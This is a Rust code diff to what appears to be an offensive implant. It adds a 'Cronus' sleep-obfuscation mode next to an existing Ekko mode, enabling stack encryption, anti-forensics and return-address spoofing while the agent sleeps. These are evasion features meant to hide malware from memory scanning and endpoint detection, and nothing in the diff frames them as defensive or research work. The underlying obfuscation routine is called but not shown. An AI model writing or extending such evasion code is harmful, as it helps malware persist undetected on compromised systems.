@@ -82,6 +82,8 @@ pub fn execute_sleep(duration: std::time::Duration, config: &SleepConfig) -> Res
                 // the advanced path.
                 soc.anti_forensics = true;
                 soc.spoof_return_address = true;
+                // Ekko/Foliage map to the Ekko variant (NtDelayExecution).
+                soc.variant = crate::sleep_obfuscation::SleepVariant::Ekko;
                 return crate::sleep_obfuscation::secure_sleep(soc);
             }
             #[cfg(not(target_arch = "x86_64"))]
@@ -99,6 +101,32 @@ pub fn execute_sleep(duration: std::time::Duration, config: &SleepConfig) -> Res
                 } else {
                     std::thread::sleep(duration);
                 }
+                return Ok(());
+            }
+        }
+        SleepMethod::Cronus => {
+            // Cronus: waitable-timer-based sleep (NtSetTimer).
+            // Falls back to Ekko if timer APIs unavailable.
+            #[cfg(target_arch = "x86_64")]
+            {
+                info!(
+                    "Initiating Cronus sleep obfuscation for {:?}",
+                    duration
+                );
+                let mut soc = crate::sleep_obfuscation::SleepObfuscationConfig::default();
+                soc.sleep_duration_ms = duration.as_millis() as u64;
+                soc.encrypt_stack = config.sleep_mask_enabled;
+                soc.encrypt_heap = false;
+                soc.anti_forensics = true;
+                soc.spoof_return_address = true;
+                soc.variant = crate::sleep_obfuscation::SleepVariant::Cronus;
+                return crate::sleep_obfuscation::secure_sleep(soc);
+            }
+            #[cfg(not(target_arch = "x86_64"))]
+            {
+                // Fall through to standard sleep on non-x86_64.
+                info!("Cronus not supported on non-x86_64, using standard sleep");
+                std::thread::sleep(duration);
                 return Ok(());
             }
         }
